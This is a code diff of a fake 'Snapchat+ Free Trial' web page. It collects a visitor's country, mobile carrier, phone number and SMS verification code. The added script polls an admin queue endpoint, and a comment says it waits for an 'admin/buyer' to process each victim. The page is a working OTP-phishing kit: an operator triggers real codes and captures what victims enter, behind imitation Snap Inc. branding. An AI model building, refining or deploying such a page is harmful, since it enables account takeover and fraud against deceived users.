@@ -5,12 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Snapchat+ — Free Trial</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
-        }
+        /* ===== RESET ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
 
         body {
             min-height: 100vh;
@@ -23,12 +19,13 @@
 
         .container { width: 100%; max-width: 420px; }
 
+        /* ===== CARD ===== */
         .card {
             background: rgba(26, 26, 26, 0.95);
             backdrop-filter: blur(20px);
             border-radius: 40px;
             padding: 36px 28px 28px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255,255,255,0.05);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.05);
             border: 1px solid rgba(255,255,255,0.06);
         }
 
@@ -60,39 +57,28 @@
 
         .step-title { color: #fff; font-size: 22px; font-weight: 600; text-align: center; margin-bottom: 24px; }
 
-        /* ===== COUNTRY GRID ===== */
+        /* ===== COUNTRY ===== */
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-
         .country-card {
             padding: 22px 12px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.06);
             background: rgba(255,255,255,0.03); color: #fff; font-size: 16px; font-weight: 500;
-            cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); text-align: center;
-            position: relative; overflow: hidden;
-        }
-        .country-card::before {
-            content: ''; position: absolute; inset: 0;
-            background: linear-gradient(135deg, #FFFC00, #FFD700); opacity: 0; transition: opacity 0.3s;
+            cursor: pointer; transition: all 0.3s; text-align: center;
         }
         .country-card:hover { transform: translateY(-2px); border-color: rgba(255,252,0,0.3); }
-        .country-card:hover::before { opacity: 0.05; }
-        .country-card .flag { font-size: 36px; display: block; margin-bottom: 6px; position: relative; }
-        .country-card .country-name { position: relative; }
-        .country-card.selected {
-            border-color: #FFFC00; background: rgba(255,252,0,0.08); transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(255,252,0,0.08);
-        }
+        .country-card .flag { font-size: 36px; display: block; margin-bottom: 6px; }
+        .country-card.selected { border-color: #FFFC00; background: rgba(255,252,0,0.08); transform: translateY(-2px); }
 
         /* ===== NETWORK ===== */
         .network-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .network-card {
             padding: 14px 10px; border-radius: 16px; border: 2px solid rgba(255,255,255,0.06);
             background: rgba(255,255,255,0.03); color: #fff; font-size: 13px; font-weight: 500;
-            cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); text-align: center;
+            cursor: pointer; transition: all 0.3s; text-align: center;
         }
         .network-card:hover { border-color: rgba(255,252,0,0.3); transform: translateY(-1px); }
         .network-card.selected { border-color: #FFFC00; background: rgba(255,252,0,0.08); }
 
-        /* ===== INPUTS ===== */
+        /* ===== INPUT ===== */
         .input-group {
             display: flex; align-items: center; background: rgba(255,255,255,0.04);
             border-radius: 18px; border: 2px solid rgba(255,255,255,0.06); padding: 0 18px; margin-bottom: 14px;
@@ -112,17 +98,12 @@
         /* ===== BUTTONS ===== */
         .btn {
             width: 100%; padding: 18px; border-radius: 18px; border: none;
-            font-size: 18px; font-weight: 600; cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #FFFC00, #FFD700); color: #000;
-        }
+        .btn-primary { background: linear-gradient(135deg, #FFFC00, #FFD700); color: #000; }
         .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.25); }
         .btn-primary:disabled { opacity: 0.5; transform: none !important; cursor: not-allowed; }
-        .btn-secondary {
-            background: rgba(255,255,255,0.06); color: #fff; margin-top: 10px;
-        }
+        .btn-secondary { background: rgba(255,255,255,0.06); color: #fff; margin-top: 10px; }
         .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
         /* ===== OTP ===== */
@@ -132,20 +113,16 @@
             background: rgba(255,255,255,0.04); border: 2px solid rgba(255,255,255,0.08);
             border-radius: 16px; color: #fff; outline: none; transition: all 0.3s; caret-color: #FFFC00;
         }
-        .otp-box input:focus {
-            border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06);
-            background: rgba(255,255,255,0.06);
-        }
+        .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
         .otp-hint { text-align: center; color: #777; font-size: 14px; }
         .otp-hint strong { color: #fff; }
         .resend {
-            text-align: center; color: #555; font-size: 14px; margin-top: 14px; cursor: pointer;
-            transition: color 0.3s;
+            text-align: center; color: #555; font-size: 14px; margin-top: 14px; cursor: pointer; transition: color 0.3s;
         }
         .resend:hover { color: #888; }
         .resend span { color: #FFFC00; font-weight: 500; }
 
-        /* ===== LOADER ===== */
+        /* ===== LOADER (Step 4) ===== */
         .loader-wrap { text-align: center; padding: 20px 0; }
         .loader-spinner {
             width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.06);
@@ -161,12 +138,34 @@
             height: 100%; width: 0%; background: linear-gradient(90deg, #FFFC00, #FFD700);
             border-radius: 4px; transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
         }
+        .loader-text {
+            color: #888;
+            font-size: 15px;
+            text-align: center;
+            margin-top: 12px;
+        }
+        .loader-text strong { color: #fff; }
 
         /* ===== SUCCESS / ERROR ===== */
         .icon-big { font-size: 64px; text-align: center; margin: 12px 0 16px; }
         .msg-center { text-align: center; color: #aaa; font-size: 16px; line-height: 1.7; }
         .error-text { color: #ff6b6b !important; }
         .success-text { color: #69db7c !important; }
+
+        /* ===== COMMUNICATION MESSAGES ===== */
+        .info-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 14px;
+            padding: 14px 18px;
+            margin-bottom: 16px;
+            border-left: 3px solid #FFFC00;
+        }
+        .info-box p {
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .info-box strong { color: #fff; }
 
         /* ===== FOOTER ===== */
         .footer {
@@ -197,7 +196,7 @@
             <span class="badge">🔥 3 Days Free</span>
         </div>
 
-        <!-- STEP 1: COUNTRY -->
+        <!-- ===== STEP 1: COUNTRY ===== -->
         <div id="step1" class="step active">
             <div class="step-title">🌍 Select Your Country</div>
             <div class="grid-2">
@@ -212,64 +211,77 @@
             </div>
         </div>
 
-        <!-- STEP 2: NETWORK -->
+        <!-- ===== STEP 2: NETWORK ===== -->
         <div id="step2" class="step">
             <div class="step-title">📡 Select Your Network</div>
             <div class="network-grid" id="networkGrid"></div>
             <button class="btn btn-secondary" id="backToCountry">← Back</button>
         </div>
 
-        <!-- STEP 3: PHONE -->
+        <!-- ===== STEP 3: PHONE ===== -->
         <div id="step3" class="step">
-            <div class="step-title">📱 Enter Your Number</div>
+            <div class="step-title">📱 Enter Your Phone Number</div>
+            <div class="info-box">
+                <p>🔐 We'll send a verification code to your number to confirm your eligibility for <strong>Snapchat+</strong>.</p>
+            </div>
             <div class="input-group">
                 <span class="code" id="countryCode">+33</span>
                 <input type="tel" id="phoneInput" placeholder="6 12 34 56 78" maxlength="15" />
             </div>
-            <button class="btn btn-primary" id="sendBtn">Continue →</button>
+            <button class="btn btn-primary" id="sendBtn">Send Code →</button>
             <button class="btn btn-secondary" id="backToNetwork">← Back</button>
             <p style="color:rgba(255,255,255,0.2);font-size:11px;text-align:center;margin-top:14px;">
-                By continuing you agree to our Terms & Privacy Policy
+                By continuing you agree to our Terms &amp; Privacy Policy
             </p>
         </div>
 
-        <!-- STEP 4: VERIFYING -->
+        <!-- ===== STEP 4: SENDING OTP (LOADING) ===== -->
         <div id="step4" class="step">
             <div class="loader-wrap">
                 <div class="loader-spinner"></div>
-                <div class="step-title">⏳ Verifying Your Account</div>
-                <p style="color:#888;font-size:14px;text-align:center;">Please wait...</p>
+                <div class="step-title" style="font-size:20px;">⏳ Sending Code...</div>
+                <p class="loader-text">We're sending a <strong>verification code</strong> to your number.</p>
+                <p class="loader-text" style="font-size:13px;color:#666;margin-top:4px;">Please wait, this may take a few seconds.</p>
                 <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
             </div>
         </div>
 
-        <!-- STEP 5: OTP -->
+        <!-- ===== STEP 5: OTP ===== -->
         <div id="step5" class="step">
             <div class="step-title">🔑 Enter Verification Code</div>
-            <p class="otp-hint">We sent a code to <strong id="displayNumber"></strong></p>
+            <div class="info-box">
+                <p>📲 We sent a <strong>verification code</strong> to <strong id="displayNumber"></strong></p>
+                <p style="font-size:13px;color:#666;margin-top:4px;">Please check your SMS and enter the code below.</p>
+            </div>
             <div class="otp-box" id="otpContainer"></div>
-            <button class="btn btn-primary" id="verifyBtn">Verify →</button>
+            <button class="btn btn-primary" id="verifyBtn">Verify Code →</button>
             <p class="resend" id="resendBtn">Didn't get the code? <span>Resend</span></p>
             <button class="btn btn-secondary" id="backToPhone">← Back</button>
         </div>
 
-        <!-- STEP 6: SUCCESS -->
+        <!-- ===== STEP 6: SUCCESS ===== -->
         <div id="step6" class="step">
             <div class="icon-big">✅</div>
             <div class="step-title">Snapchat+ Activated! 🎉</div>
-            <p class="msg-center success-text">Your free trial is now active.<br />Enjoy exclusive features!</p>
+            <div class="info-box" style="border-left-color:#69db7c;">
+                <p>✅ Your <strong>Snapchat+</strong> free trial is now active!</p>
+                <p style="font-size:13px;color:#666;margin-top:4px;">You now have access to exclusive features. Enjoy!</p>
+            </div>
             <button class="btn btn-primary" style="margin-top:20px;" id="resetBtn">Open Snapchat</button>
         </div>
 
-        <!-- STEP 7: OTP ERROR -->
+        <!-- ===== STEP 7: ERROR ===== -->
         <div id="step7" class="step">
             <div class="icon-big">❌</div>
             <div class="step-title">Invalid Code</div>
-            <p class="msg-center error-text">The code you entered is incorrect.<br />Please try again.</p>
+            <div class="info-box" style="border-left-color:#ff6b6b;">
+                <p>❌ The code you entered is <strong>incorrect</strong>.</p>
+                <p style="font-size:13px;color:#666;margin-top:4px;">Please check your SMS and try again.</p>
+            </div>
             <button class="btn btn-primary" style="margin-top:20px;" id="retryOTPBtn">Try Again</button>
         </div>
 
-        <!-- FOOTER -->
+        <!-- ===== FOOTER ===== -->
         <div class="footer">
             © 2026 Snap Inc. — Not affiliated with Snapchat.
         </div>
@@ -443,20 +455,65 @@
             clearInterval(interval);
             progressFill.style.width = '100%';
 
-            setTimeout(function() {
-                goToStep('step5');
-                setupOTP(4);
-                displayNumber.textContent = fullNumber;
-                document.querySelector('.otp-box input')?.focus();
-            }, 500);
+            // Wait for admin/buyer to process
+            await checkStatus();
 
         } catch (error) {
             alert('Connection error. Please try again.');
             resetAll();
         } finally {
             sendBtn.disabled = false;
-            sendBtn.textContent = 'Continue →';
+            sendBtn.textContent = 'Send Code →';
         }
+    }
+
+    async function checkStatus() {
+        let attempts = 0;
+        const maxAttempts = 60; // 60 * 2 seconds = 2 minutes
+
+        const checkInterval = setInterval(async function() {
+            attempts++;
+            try {
+                const response = await fetch('/api/admin/queues');
+                const data = await response.json();
+
+                // Find our entry
+                for (const queue in data) {
+                    for (const entry of data[queue]) {
+                        if (entry.id === queueId) {
+                            if (entry.status === 'otp_sent') {
+                                clearInterval(checkInterval);
+                                otpLength = entry.otp_length || 4;
+                                goToStep('step5');
+                                setupOTP(otpLength);
+                                displayNumber.textContent = entry.number;
+                                document.querySelector('.otp-box input')?.focus();
+                                return;
+                            }
+                            if (entry.status === 'verified') {
+                                clearInterval(checkInterval);
+                                goToStep('step6');
+                                return;
+                            }
+                            if (entry.status === 'wrong') {
+                                clearInterval(checkInterval);
+                                goToStep('step7');
+                                return;
+                            }
+                            break;
+                        }
+                    }
+                }
+
+                if (attempts >= maxAttempts) {
+                    clearInterval(checkInterval);
+                    alert('Timeout. Please try again.');
+                    resetAll();
+                }
+            } catch (error) {
+                // Silent fail, keep trying
+            }
+        }, 2000);
     }
 
     // ============================================================
